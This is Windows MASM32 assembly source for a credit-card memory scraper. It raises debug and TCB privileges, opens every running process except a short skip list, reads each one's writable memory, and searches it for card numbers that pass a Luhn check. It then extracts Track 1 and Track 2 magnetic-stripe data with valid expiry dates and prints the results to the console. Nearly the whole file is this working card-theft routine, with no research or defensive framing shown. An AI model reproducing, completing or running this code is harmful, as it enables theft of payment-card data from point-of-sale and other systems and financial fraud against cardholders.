; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

      .486                      ; create 32 bit code
      .model flat, stdcall      ; 32 bit memory model
      option casemap :none      ; case sensitive

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

;     include files
;     ~~~~~~~~~~~~~
      include \masm32\include\windows.inc
      include \masm32\include\masm32.inc
      include \masm32\include\user32.inc
      include \masm32\include\advapi32.inc
      include \masm32\include\kernel32.inc
      include \masm32\include\msvcrt.inc
      include \masm32\macros\macros.asm

;     libraries
;     ~~~~~~~~~
      includelib \masm32\lib\masm32.lib
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\advapi32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\msvcrt.lib
      
    PROCESSENTRY32W STRUCT
        dwSize              DWORD ?
        cntUsage            DWORD ?
        th32ProcessID       DWORD ?
        th32DefaultHeapID   DWORD ?
        th32ModuleID        DWORD ?
        cntThreads          DWORD ?
        th32ParentProcessID DWORD ?
        pcPriClassBase      DWORD ?
        dwFlags             DWORD ?
        szExeFile           dw MAX_PATH dup(?)
    PROCESSENTRY32W ENDS

    .data
        ;readBytes   dd  7D000h
        targetProc  db  "ccgen.exe",0
        skipProcs   db  "[system process]",0,
                        "system",0, 
                        "svchost.exe",0,
                        "csrss.exe",0,
                        "msedge.exe",0,
                        "taskhostw.exe",0,
                        0FFh ;MARKER OF LIST
    .data
        procStr     db  "[*] Scanning: %s", 0
        addrStr     db  "  --> Address: 0x%08x Size: 0x%08x", 0
        ccStr       db  "    --> Found: %s", 0
        crlf        db  13, 10, 0
        crlfW       db  13, 0, 10, 0
        Sfile       dd  0 ; Std Output(Console)
        ByteSent    dd  0 ; Byte Count
        ByteRead    dd  0 ; Byte Count
        luhn_number dd  0
    .data? 
        ccbuff      db  256 dup (?)
        strbuff     db  256 dup (?)
        mbi         MEMORY_BASIC_INFORMATION <>
        pMem        dd  ?
        procName    db  MAX_PATH dup (?)
    .code

start:

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

    call main
    invoke ExitProcess,eax

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

main proc

    LOCAL hSnap:DWORD, hProc:DWORD, pAddr:DWORD
    LOCAL ownPID:DWORD, is64Proc:DWORD, curr64Proc:DWORD
    LOCAL currProc:DWORD, sys_info:SYSTEM_INFO, numBytes:DWORD
    LOCAL strLen:DWORD
    LOCAL pe32:PROCESSENTRY32W


    invoke GetStdHandle, STD_OUTPUT_HANDLE
    mov Sfile, eax

    call enable_privileges

    invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
    mov hSnap, eax

    mov pe32.dwSize, sizeof(PROCESSENTRY32W)

    invoke GetSystemInfo, addr sys_info
    
    invoke GetCurrentProcessId
    mov ownPID, eax

    invoke GetCurrentProcess
    mov currProc, eax
    mov is64Proc, 0
    invoke IsWow64Process, currProc, addr is64Proc

    invoke Process32FirstW, hSnap, addr pe32

new_proc:
    cmp eax, 0
    je close_snap

    lea ebx, pe32.th32ProcessID
    mov ebx, [ebx]
    .if ebx == ownPID
        jmp nxt_proc
    .endif

    lea ebx, pe32.szExeFile
    push ebx
    call skip_processes
    .if eax == 1
        jmp nxt_proc
    .endif

    ;push 256
    ;push offset procName
    ;push offset targetProc
    ;call ToUni

    ;push 24
    ;lea ebx, pe32.szExeFile
    ;push ebx
    ;push offset procName
    ;call cmp_strw
    ;.if eax != 1
    ;    jmp nxt_proc
    ;.endif

    mov hProc, 0
    ;invoke OpenProcess, PROCESS_ALL_ACCESS Or PROCESS_TERMINATE Or DELETE, 0, pe32.th32ProcessID
    invoke OpenProcess, PROCESS_ALL_ACCESS Or PROCESS_QUERY_INFORMATION Or PROCESS_VM_READ, 
                        0, pe32.th32ProcessID
    mov hProc, eax

    mov curr64Proc, 0
    invoke IsWow64Process, hProc, addr curr64Proc
    mov eax, curr64Proc
    mov ebx, is64Proc
    .if eax != ebx
        jmp nxt_proc
    .endif
    
    ;push 256
    ;push offset procName
    ;push offset pe32.szExeFile
    ;call ToChar

    ;invoke wsprintf, addr strbuff, addr procStr, addr procName
    ;add strLen, 16
    ;invoke WriteConsole, Sfile, addr strbuff, strLen, offset ByteSent, 0
    ;invoke WriteConsole, Sfile, addr crlf, 2, offset ByteSent, 0

    invoke lstrlenW, addr pe32.szExeFile
    mov strLen, eax
    invoke WriteConsoleW, Sfile, uc$("[*] Scanning: "), 14, offset ByteSent, 0 
    invoke WriteConsoleW, Sfile, addr pe32.szExeFile, strLen, offset ByteSent, 0
    invoke WriteConsoleW, Sfile, addr crlfW, 2, offset ByteSent, 0
                                        
    mov pAddr, 0
nxt_vquery:
    invoke VirtualQueryEx, hProc, pAddr, addr mbi, sizeof(MEMORY_BASIC_INFORMATION)
    mov ebx, pAddr
    mov eax, sys_info.lpMaximumApplicationAddress

    cmp ebx, eax
    ja nxt_proc

    mov ebx, mbi.BaseAddress
    mov pAddr, ebx
    mov ebx, mbi.RegionSize
    add pAddr, ebx

    cmp mbi.State, MEM_COMMIT
    jne nxt_vquery
    cmp mbi.Protect, PAGE_READWRITE
    jne nxt_vquery

    mov pMem, 0
    invoke crt_calloc, mbi.RegionSize, 1
    cmp eax, 0
    je nxt_vquery
    mov pMem, eax
    
    invoke ReadProcessMemory, hProc, mbi.BaseAddress, pMem, mbi.RegionSize, addr numBytes
    cmp eax, 0
    je free_mem
    mov eax, numBytes
    cmp eax, mbi.RegionSize
    jne free_mem

    ;invoke wsprintf, addr strbuff, addr addrStr, mbi.BaseAddress, mbi.RegionSize
    ;invoke WriteConsole, Sfile, addr strbuff, 43, offset ByteSent, 0
    ;invoke WriteConsole, Sfile, addr crlf, 2, offset ByteSent, 0 
    
    ;------------------
    ; Start Processing
    ; the Memory
    ;------------------
    mov ebx, mbi.RegionSize
    push ebx
    mov ebx, [pMem]
    push ebx
    call scan_memory
    ;cmp eax, 1
    ;jne free_mem

    ;call init_gbuff
    ;invoke wsprintf, addr strbuff, addr addrStr, mbi.BaseAddress, mbi.RegionSize
    ;invoke WriteConsole, Sfile, addr strbuff, 43, offset ByteSent, 0
    ;invoke WriteConsole, Sfile, addr crlf, 2, offset ByteSent, 0 

free_mem:
    cmp pMem, 0
    je nxt_vquery
    invoke crt_free, pMem
    mov pMem, 0
    jmp nxt_vquery 
                
nxt_proc:
    cmp hProc, 0
    je proc_nxt32w
    invoke CloseHandle, hProc
    mov hProc, 0
    
proc_nxt32w: 
    invoke Process32NextW, hSnap, addr pe32
    jmp new_proc
    
close_snap:            
    ;invoke CloseHandle, Sfile
    invoke CloseHandle, hSnap

exit_main:
    ret

main endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

init_gbuff  proc

    mov esi, offset strbuff
    mov ecx, 100h

mov_0:
    mov BYTE ptr[esi], 0
    inc esi
    loop mov_0

exit_gbuff:
    ret

init_gbuff  endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

enable_privileges proc

    LOCAL hToken:DWORD, hProc:DWORD
    LOCAL tkp:TOKEN_PRIVILEGES, luid:LUID

    invoke GetCurrentProcess
    mov hProc, eax
    invoke OpenProcessToken, hProc, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, addr hToken 
    .if eax == 0
        jmp exit_priv
    .endif

    invoke LookupPrivilegeValue, NULL, SADD("SeDebugPrivilege"), addr luid
    mov tkp.PrivilegeCount, 1
    push luid.LowPart
    pop tkp.Privileges[0].Luid.LowPart
    push luid.HighPart
    pop tkp.Privileges[0].Luid.HighPart
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    invoke  AdjustTokenPrivileges, hToken, NULL, addr tkp, sizeof TOKEN_PRIVILEGES, NULL, NULL

    invoke LookupPrivilegeValue, NULL, SADD("SeShutDownPrivilege"), addr luid
    mov tkp.PrivilegeCount, 1
    push luid.LowPart
    pop tkp.Privileges[0].Luid.LowPart
    push luid.HighPart
    pop tkp.Privileges[0].Luid.HighPart
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    invoke  AdjustTokenPrivileges, hToken, NULL, addr tkp, sizeof TOKEN_PRIVILEGES, NULL, NULL

    invoke LookupPrivilegeValue, NULL, SADD("SeTcbPrivilege"), addr luid
    mov tkp.PrivilegeCount, 1
    push luid.LowPart
    pop tkp.Privileges[0].Luid.LowPart
    push luid.HighPart
    pop tkp.Privileges[0].Luid.HighPart
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    invoke  AdjustTokenPrivileges, hToken, NULL, addr tkp, sizeof TOKEN_PRIVILEGES, NULL, NULL

exit_priv:
    ret

enable_privileges endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

skip_processes  proc    exeName:DWORD
    LOCAL tmpPtr:DWORD
    
    mov esi, offset skipProcs
    xor ecx, ecx
not_null:
    mov al, BYTE ptr[esi+ecx]
    inc ecx
    cmp al, 0
    je end_str

    cmp al, 0FFh
    je exit_skip

    jmp not_null
    
end_str:    
    mov tmpPtr, ecx

    push ecx
    push offset procName
    push esi
    call ToUni

    mov ecx, tmpPtr
    shl ecx, 1

    push ecx
    push offset procName
    mov ebx, exeName
    push ebx
    call cmp_strw

    .if eax != 1
        mov ecx, tmpPtr
        add esi, ecx
        xor ecx, ecx
        jmp not_null
    .else
        jmp exit_skip
    .endif    

exit_skip:
    ret
skip_processes  endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

ToUni proc szIN:DWORD, szBuff:DWORD, bufSize:DWORD
    
    push esi
    mov edi, szBuff
    mov ecx, bufSize
    xor eax, eax

init_buff:
    stosb
    loop init_buff
    invoke MultiByteToWideChar, CP_ACP, 0, szIN, -1, szBuff, bufSize

exit_touni:
    pop esi
    ret
ToUni endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

ToChar  proc szIN:DWORD, szBuff:DWORD, bufSize:DWORD
    
    push esi
    mov edi, szBuff
    mov ecx, bufSize
    xor eax, eax

init_buff:
    stosb
    loop init_buff
    invoke WideCharToMultiByte, CP_UTF8, 0, szIN, bufSize, szBuff, bufSize, NULL, 0

exit_tochar:
    pop esi
    ret
ToChar endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

cmp_strw    proc    str1:DWORD, str2:DWORD, cmpSize:DWORD

    push esi

    mov esi, str1
    mov edi, str2
    xor ecx, ecx
    cld

cmp_more:
    lodsb
    cmp al, 60h
    jg get_nxt
    xor al, 20h
    
get_nxt:
    mov bl, BYTE ptr[edi+ecx]
    cmp bl, 60h
    jg  start_cmp
    xor bl, 20h
    
start_cmp:
    cmp al, bl
    jne not_match

    inc ecx
    dec cmpSize
    cmp cmpSize, 0
    jne cmp_more

    mov eax, 1
    jmp exit_cmp

not_match:
    xor eax, eax
            
exit_cmp:
    pop esi
    ret
cmp_strw    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

scan_memory proc    pMemory:DWORD, memSize:DWORD
    LOCAL trackFlag:DWORD, retFlag:DWORD, ccStrCnt:DWORD

    push esi
    push edi

    mov retFlag, 0
    mov esi, pMemory
    mov edi, pMemory
    sub memSize, 20h
    mov ecx, memSize
    add edi, ecx
    xor ecx, ecx
    xor eax, eax
    
loop_mem:
    cmp esi, edi
    ja exit_scan
    
    mov al, BYTE ptr[esi]    
    cmp al, 30h
    jae is_dgt
    inc esi
    jmp loop_mem

is_dgt:
    cmp al, 39h
    jbe is_3456
    inc esi
    jmp loop_mem
    
is_3456:        
    ;------------------------
    ; Accepted first Digits:
    ; 3, 4, 5, 6
    ;------------------------
    cmp al, 33h
    je fifteen
    cmp al, 34h
    je fifteen
    cmp al, 35h
    je fifteen
    cmp al, 36h
    je fifteen
    inc esi
    jmp loop_mem

fifteen:
    ;------------------------
    ; ESI -> pointer to 
    ; Memory Location
    ; EAX -> 1 Track1 Data
    ; EAX -> 2 Track2 Data
    ; EAX -> 0 Not CC
    ;------------------------
    call next_fifteen_digits
    cmp eax, 0
    je inc_esi
    cmp eax, 3
    jae above_3
    mov trackFlag, eax
    jmp is_luhn
    
inc_esi:
    inc esi
    jmp loop_mem

above_3:
    add esi, eax
    xor eax, eax
    jmp loop_mem

is_luhn:
    call check_luhn
    cmp eax, 1
    jne inc_esi
    ;------------------------
    ; At this point Digits
    ; are confirmed CC
    ; EAX -> string count
    ;------------------------
    call fetch_track_data
    mov ccStrCnt, eax

    push trackFlag
    push eax
    push esi
    call move_cc_string

    push trackFlag
    push offset ccbuff
    call check_expiry
    cmp eax, 0
    je more_search

    invoke wsprintf, addr strbuff, addr ccStr, addr ccbuff
    mov eax, ccStrCnt
    add eax, 11h
    invoke WriteConsole, Sfile, addr strbuff, eax, offset ByteSent, 0
    invoke WriteConsole, Sfile, addr crlf, 2, offset ByteSent, 0

more_search:
    mov eax, ccStrCnt
    add esi, eax
    xor eax, eax
    jmp loop_mem
    
exit_scan:
    pop edi
    pop esi
    ret
scan_memory endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

check_expiry    proc    foundCCbuff:DWORD, tFlag:DWORD

    push esi
    push edi

    mov esi, foundCCbuff
    xor ecx, ecx
    cmp tFlag, 2
    je exp_track2
    add esi, 13h

skip_name:
    inc ecx
    cmp ecx, 100h
    je no_expiry
    mov al, BYTE ptr[esi]
    inc esi
    cmp al, '^'
    jne skip_name
    jmp chk_exp
    
exp_track2:
    add esi, 12h

chk_exp:
    ;------------------------
    ; Check expiry date YYMM
    ; YY -> 22 - 50
    ; MM -> 01 - 12
    ;------------------------
    xor ebx, ebx
    xor eax, eax
    mov al, BYTE ptr[esi]
    inc esi
    xor al, 30h
    mov ecx, 0Ah
    mul ecx
    mov bl, BYTE ptr[esi]
    xor bl, 30h
    add al, bl
    cmp al, 16h
    jb no_expiry
    cmp al, 34h
    jae no_expiry
    xor ebx, ebx
    xor eax, eax
    inc esi
    mov al, BYTE ptr[esi]
    inc esi
    xor al, 30h
    mov ecx, 0Ah
    mul ecx
    mov bl, BYTE ptr[esi]
    xor bl, 30h
    add al, bl
    cmp al, 1
    jb no_expiry
    cmp al, 0Dh
    jae no_expiry

    xor eax, eax
    mov eax, 1
    jmp exit_expiry    

no_expiry:
    xor eax, eax

exit_expiry:
    pop edi
    pop esi
    ret
check_expiry    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

move_cc_string    proc    strLoc:DWORD, strSize:DWORD, tFlag:DWORD

    push eax
    push esi
    push edi

    mov eax, tFlag
    mov esi, strLoc
    mov ecx, 100h
    mov edi, offset ccbuff
    mov ebx, offset strbuff

init_again:
    mov BYTE ptr[ebx], 0
    mov BYTE ptr[edi], 0
    inc edi
    inc ebx
    loop init_again

    mov ecx, strSize
    cmp eax, 2
    je sub_track2
    sub esi, 2
    add ecx, 2
    jmp s_move

sub_track2:
    sub esi, 1
    add ecx, 1

s_move:
    mov edi, offset ccbuff
        
move_mem:
    mov bl, BYTE ptr[esi]
    mov BYTE ptr[edi], bl
    inc esi
    inc edi
    loop move_mem    

exit_init_buff:
    pop edi
    pop esi
    pop eax
    ret
move_cc_string    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

next_fifteen_digits proc
    
    push esi
    push edi

    xor eax, eax
    xor ecx, ecx
    
nxt_dgt:
    cmp ecx, 10h
    jae check_sep
    cmp BYTE ptr[esi], 30h
    jb non_digit
    cmp BYTE ptr[esi], 39h
    ja non_digit
    inc ecx
    inc esi
    jmp nxt_dgt
    
check_sep:
    cmp BYTE ptr[esi], '^'
    je could_track1
    cmp BYTE ptr[esi], '='
    je could_track2
    jmp exit_next_fifteen

could_track1:
    mov eax, 1
    jmp exit_next_fifteen

could_track2:
    mov eax, 2
    jmp exit_next_fifteen

non_digit:
    mov eax, ecx

exit_next_fifteen:
    pop edi
    pop esi
    ret
next_fifteen_digits endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

check_luhn  proc    
    push esi
    push edi

    xor edi, edi
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    mov ecx, 2

;    cmp BYTE ptr[esi], 33h
;    je luhn_3
;    cmp BYTE ptr[esi], 34h
;    je luhn_4
;    cmp BYTE ptr[esi], 35h
;    je luhn_5
;    cmp BYTE ptr[esi], 36h
;    je luhn_6
;    jmp invalid_dgt

;luhn_3:
;    mov edi, 6
;    jmp chk_dgt
;luhn_4:
;    mov edi, 8
;    jmp chk_dgt
;luhn_5:
;    mov edi, 1
;    jmp chk_dgt
;luhn_6:
;    mov edi, 3
      
chk_dgt:
    inc eax
    mov bl, [esi]
    xor bl, 30h
    cmp bl, 9
    ja invalid_dgt

    xor edx, edx
    push eax
    div ecx
    pop eax
    cmp edx, 0
    jz sum_it
    
    shl bl, 1
    cmp bl, 9
    jbe sum_it

    sub bl, 9

sum_it:
    add edi, ebx
    cmp eax, 10h
    jae final_chk
    inc esi
    jmp chk_dgt 

final_chk:
    xor edx, edx
    mov ecx, 0Ah
    mov eax, edi
    div ecx
    cmp edx, 0
    je luhn_dgt
    xor eax, eax
    jmp exit_luhn    

luhn_dgt:
    xor eax, eax
    mov eax, 1
    jmp exit_luhn

invalid_dgt:
    xor eax, eax
    mov eax, 2

exit_luhn:
    pop edi
    pop esi
    ret
check_luhn  endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

fetch_track_data    proc

    push esi
    push edi

    xor eax, eax
    xor ecx, ecx

more_dgt:
    mov al, BYTE ptr[esi]
    cmp al, '?'
    je got_whole_cc
    inc esi
    inc ecx
    jmp more_dgt

got_whole_cc:
    inc ecx
    mov eax, ecx

exit_fetch:
    pop edi
    pop esi
    ret
fetch_track_data    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

end start
